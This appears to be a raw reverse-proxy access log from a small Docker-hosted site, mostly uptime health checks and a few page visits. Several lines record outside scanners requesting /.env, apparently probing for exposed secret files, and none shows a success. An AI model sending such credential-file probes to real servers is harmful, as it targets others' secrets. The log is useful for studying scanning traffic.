159.203.109.206 - - [20/Dec/2023:23:14:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3305 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:23:14:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3306 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:15:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3307 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:23:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3308 "www@docker" "http://172.20.0.9:80" 0ms
95.214.235.169 - - [20/Dec/2023:23:15:52 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3309 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [20/Dec/2023:23:15:54 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3310 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:23:16:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3311 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:16:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3312 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:17:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3313 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3314 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:18:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3315 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3316 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:19:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3317 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3318 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:20:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3319 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3320 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:21:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3321 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3322 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:22:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3323 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3324 "www@docker" "http://172.20.0.9:80" 0ms
35.203.210.71 - - [20/Dec/2023:23:22:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3325 "web-to-websecure@internal" "-" 0ms
35.203.210.71 - - [20/Dec/2023:23:22:49 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3326 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:23:23:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3327 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3328 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:24:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3329 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3330 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:25:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3331 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3332 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:26:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3333 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3334 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:27:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3335 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3336 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:28:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3337 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:28:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3338 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:29:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3339 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:29:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3340 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:30:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3341 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:30:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3342 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:31:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3343 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:31:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3344 "www@docker" "http://172.20.0.9:80" 1ms
213.32.39.45 - - [20/Dec/2023:23:31:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3345 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:23:32:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3346 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:32:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3347 "www@docker" "http://172.20.0.9:80" 1ms
45.33.87.154 - - [20/Dec/2023:23:32:59 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3348 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:23:33:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3349 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:33:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3350 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:34:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3351 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:34:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3352 "www@docker" "http://172.20.0.9:80" 1ms
45.79.181.223 - - [20/Dec/2023:23:34:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3353 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:23:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3354 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:23:35:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3355 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:36:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3356 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:36:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3357 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:37:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3358 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:37:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3359 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:38:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3360 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:38:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3361 "www@docker" "http://172.20.0.9:80" 1ms
173.48.140.140 - - [20/Dec/2023:23:38:38 +0000] "GET /trace/ HTTP/2.0" 200 6089 "-" "-" 3362 "livetrace@docker" "http://172.20.0.5:80" 70ms
173.48.140.140 - - [20/Dec/2023:23:38:38 +0000] "GET /trace/styles.css?version=13 HTTP/2.0" 200 1423 "-" "-" 3363 "livetrace@docker" "http://172.20.0.5:80" 1ms
173.48.140.140 - - [20/Dec/2023:23:38:38 +0000] "GET /favicon.ico HTTP/2.0" 404 153 "-" "-" 3364 "www@docker" "http://172.20.0.9:80" 19ms
159.203.109.206 - - [20/Dec/2023:23:39:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3365 "www@docker" "http://172.20.0.9:80" 1ms
95.214.235.169 - - [20/Dec/2023:23:39:31 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3366 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:23:39:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3367 "www@docker" "http://172.20.0.9:80" 0ms
95.214.235.169 - - [20/Dec/2023:23:39:34 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3368 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:23:40:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3369 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:40:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3370 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:41:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3371 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:41:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3372 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:42:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3373 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:42:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3374 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:43:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3375 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:23:43:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3376 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:44:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3377 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:44:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3378 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:45:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3379 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:45:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3380 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:46:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3381 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:46:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3382 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:47:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3383 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:47:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3384 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:48:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3385 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:48:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3386 "www@docker" "http://172.20.0.9:80" 0ms
103.99.0.154 - - [20/Dec/2023:23:48:51 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3387 "web-to-websecure@internal" "-" 0ms
103.99.0.154 - - [20/Dec/2023:23:48:52 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3388 "web-to-websecure@internal" "-" 0ms
103.99.0.154 - - [20/Dec/2023:23:48:53 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 3389 "-" "-" 0ms
103.99.0.154 - - [20/Dec/2023:23:48:54 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 3390 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:23:49:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3391 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:49:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3392 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:50:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3393 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3394 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:51:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3395 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:23:51:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3396 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:52:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3397 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:52:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3398 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:53:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3399 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:23:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3400 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:54:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3401 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:23:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3402 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:55:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3403 "www@docker" "http://172.20.0.9:80" 0ms
172.104.210.105 - - [20/Dec/2023:23:55:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3404 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:23:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3405 "www@docker" "http://172.20.0.9:80" 0ms
172.104.11.51 - - [20/Dec/2023:23:55:36 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3406 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:23:56:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3407 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:23:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3408 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:23:57:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3409 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3410 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:58:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3411 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:58:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3412 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:23:59:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3413 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:23:59:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3414 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:00:00:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3415 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:00:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3416 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:01:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3417 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3418 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:02:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3419 "www@docker" "http://172.20.0.9:80" 23ms
167.71.120.76 - - [21/Dec/2023:00:02:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3420 "www@docker" "http://172.20.0.9:80" 18ms
159.203.109.206 - - [21/Dec/2023:00:03:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3421 "www@docker" "http://172.20.0.9:80" 28ms
167.71.120.76 - - [21/Dec/2023:00:03:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3422 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:04:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3423 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:00:04:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3424 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:05:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3425 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:05:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3426 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:00:06:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3427 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:06:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3428 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:07:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3429 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:07:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3430 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:00:08:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3431 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:00:08:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3432 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:09:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3433 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:00:09:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3434 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:00:10:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3435 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:10:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3436 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:00:11:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3437 "www@docker" "http://172.20.0.9:80" 1ms
45.237.116.184 - - [21/Dec/2023:00:11:23 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3438 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [21/Dec/2023:00:11:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3439 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:12:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3440 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:12:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3441 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:13:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3442 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:00:13:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3443 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:14:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3444 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:00:14:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3445 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [21/Dec/2023:00:14:36 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3446 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:00:15:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3447 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3448 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:00:16:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3449 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:16:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3450 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:00:17:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3451 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3452 "www@docker" "http://172.20.0.9:80" 1ms
167.94.138.33 - - [21/Dec/2023:00:17:52 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3453 "-" "-" 0ms
167.94.138.33 - - [21/Dec/2023:00:17:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3454 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:00:18:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3455 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3456 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:19:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3457 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3458 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:20:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3459 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3460 "www@docker" "http://172.20.0.9:80" 1ms
57.129.23.166 - - [21/Dec/2023:00:21:04 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3461 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [21/Dec/2023:00:21:04 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3462 "web-to-websecure@internal" "-" 0ms
143.110.222.166 - - [21/Dec/2023:00:21:05 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3463 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:00:21:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3464 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3465 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:00:22:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3466 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:00:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3467 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:23:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3468 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3469 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:00:24:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3470 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3471 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:25:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3472 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:00:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3473 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:00:26:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3474 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:00:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3475 "www@docker" "http://172.20.0.9:80" 1ms
173.48.140.140 - - [21/Dec/2023:00:27:03 +0000] "GET /logs/ HTTP/2.0" 200 1109 "-" "-" 3476 "logpager@docker" "http://172.20.0.3:80" 31ms
173.48.140.140 - - [21/Dec/2023:00:27:04 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 200 1864 "-" "-" 3477 "logpager@docker" "http://172.20.0.3:80" 0ms
173.48.140.140 - - [21/Dec/2023:00:27:04 +0000] "GET /logs/scripts.js?version=2 HTTP/2.0" 200 1832 "-" "-" 3478 "logpager@docker" "http://172.20.0.3:80" 0ms
173.48.140.140 - - [21/Dec/2023:00:27:04 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1737 "-" "-" 3479 "logpager@docker" "http://172.20.0.3:80" 9ms
173.48.140.140 - - [21/Dec/2023:00:27:04 +0000] "GET /favicon.ico HTTP/2.0" 404 555 "-" "-" 3480 "www@docker" "http://172.20.0.9:80" 17ms
173.48.140.140 - - [21/Dec/2023:00:27:06 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 1669 "-" "-" 3481 "logpager@docker" "http://172.20.0.3:80" 7ms
173.48.140.140 - - [21/Dec/2023:00:27:08 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 1672 "-" "-" 3482 "logpager@docker" "http://172.20.0.3:80" 10ms
173.48.140.140 - - [21/Dec/2023:00:27:09 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 1672 "-" "-" 3483 "logpager@docker" "http://172.20.0.3:80" 15ms
173.48.140.140 - - [21/Dec/2023:00:27:09 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 1672 "-" "-" 3484 "logpager@docker" "http://172.20.0.3:80" 31ms
159.203.109.206 - - [21/Dec/2023:00:27:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3485 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:00:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3486 "www@docker" "http://172.20.0.9:80" 0ms
